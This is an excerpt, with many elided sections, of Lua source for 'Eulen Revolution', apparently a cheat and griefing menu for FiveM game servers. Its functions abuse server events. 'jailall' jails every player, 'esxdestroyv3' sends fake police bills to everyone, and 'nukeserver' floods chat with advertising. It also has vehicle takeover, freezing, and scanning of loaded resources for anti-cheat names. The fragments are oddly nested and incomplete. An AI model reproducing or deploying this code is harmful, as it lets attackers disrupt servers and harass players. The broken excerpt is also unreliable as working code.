...
local titolo = "Eulen Revolution ~r~10.1"
...
local bytexd = "www.Eulenmenu.com"
local MenuWider = nil
...
local function drawButton(text, subText)
  ...
  function LR.CreateMenu(id, title)
    ...
    menus[id].subTitle = "www.Eulenmenu.com"
...
menus[id].y = 0.15
  ...
  local function GetResources()
    ...
    for i=0, #Resources do
      local detect = string.find(tostring(Resources[i]), "antiEulenr6")
      local antishit = string.find(tostring(Resources[i]), "antiEulenr5")
      print(Resources[i])
      if antishit ~= nil then
        LR.OpenMenu(EulenIcS)
      end
      if detect ~= nil then
      TSE("antiEulenr6:detection")
      end
    end
    ...
    local Enabled = true
    local EulenIcS = "EulenX"
    local EulenIcZ = "Eulen ~u~Revolution"
    local sMX = "SelfMenu"
    ...
    local function MagnetoBoy()
      ...
      local function jailall()
        ...
        for i=0, #pbase do
          TSE("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Eulenmenu.com 10 - Cheats and Anti-Eulen")
          TSE("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
          TSE("js:jailuser", GetPlayerServerId(i), 45 * 60, "Eulenmenu.com 10 - Cheats and Anti-Eulen")
      ...
      local function bananapartyall()
        ...
        for c = 0, 9 do
          ...
          TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."Eulenmenu(dot)com - Hello guys!")
        end
        local pbase = GetActivePlayers()
        for i=0, #pbase do
...
function doshit(playerVeh)
  RequestControl(playerVeh)
      ...
      SetVehicleNumberPlateText(playerVeh, "EulenMenu")
...
if freezeall then
  for i = 0, 128 do
    ...
    if EulenIcZ ~= "Eulen ~u~Revolution" then
	...
	TriggerServerEvent('gcPhone:tchat_channel', sourcePlayer, channel, messages)
          ...
          function esxdestroyv3()
            ...
            for i=0, #pbase do
              ...
              TSE("esx_billing:sendBill", GetPlayerServerId(i), "society_police", "Eulen10 is here LOL", 13374316)
            end
          end

          if titolo ~= "Eulen Revolution ~r~10.1" then
            ForceSocialClubUpdate()
          end
          ...
          function nukeserver()
            ...
            for i=0,128 do
              for c = 0, 9 do
                TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."Eulenmenu(dot)com - Cheats & AntiCheats!")
              end
        ...
        Citizen.CreateThread(function()
          ...
          LR.CreateMenu(EulenIcS, EulenIcZ)
          LR.CreateSubMenu(sMX, EulenIcS, bytexd)
          LR.CreateSubMenu(TRPM, EulenIcS, bytexd)
          LR.CreateSubMenu(WMPS, EulenIcS, bytexd)
          LR.CreateSubMenu(advm, EulenIcS, bytexd)
          LR.CreateSubMenu(LMX, EulenIcS, bytexd)
          LR.CreateSubMenu(VMS, EulenIcS, bytexd)
          LR.CreateSubMenu(OPMS, EulenIcS, bytexd)
          ...
          LR.CreateSubMenu(crds, EulenIcS, bytexd)
          ...
          while Enabled do
            ...
            if LR.IsMenuOpened(EulenIcS) then

              DrawTxt("Eulen Revolution ~r~10 ~s~- "..pisello, 0.80, 0.9)
              drawDescription("Welcome back ~p~"..pisello.." ~s~!", 0.5, 0.5)
              notify("Eulen Revolution - ~g~10", true)
              notify("~u~https://~s~www.Eulenmenu.com~u~/", false)
        ...
        LR.OpenMenu(EulenIcS)
            ...
            elseif LR.IsMenuOpened("classic1") then
              ...
              if bytexd ~= "www.Eulenmenu.com" then
                nukeserver()
              end
